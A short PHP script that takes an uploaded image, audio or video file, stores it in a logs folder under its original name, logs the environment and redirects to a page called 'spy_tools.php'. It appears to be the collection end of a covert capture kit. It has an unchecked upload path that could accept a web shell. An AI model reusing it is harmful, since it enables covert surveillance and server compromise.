<?php
/**
 * log_media.php
 * 
 * Receives a file (image/audio/video) via POST and saves to /logs.
 * For demonstration only.
 */

require_once __DIR__ . '/logger.php';

// Log environment
logEnvironment();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file     = $_FILES['file'];
    $tmpPath  = $file['tmp_name'];
    $origName = basename($file['name']);

    $destination = LOG_DIR . '/' . $origName;

    if (move_uploaded_file($tmpPath, $destination)) {
        // Optionally log a note
        $note = "[MEDIA] Uploaded file: $origName";
        logToFile(LOG_FILE_ENV, $note . "\n");
    }
}

// Redirect back or to another page
header('Location: spy_tools.php');
exit;
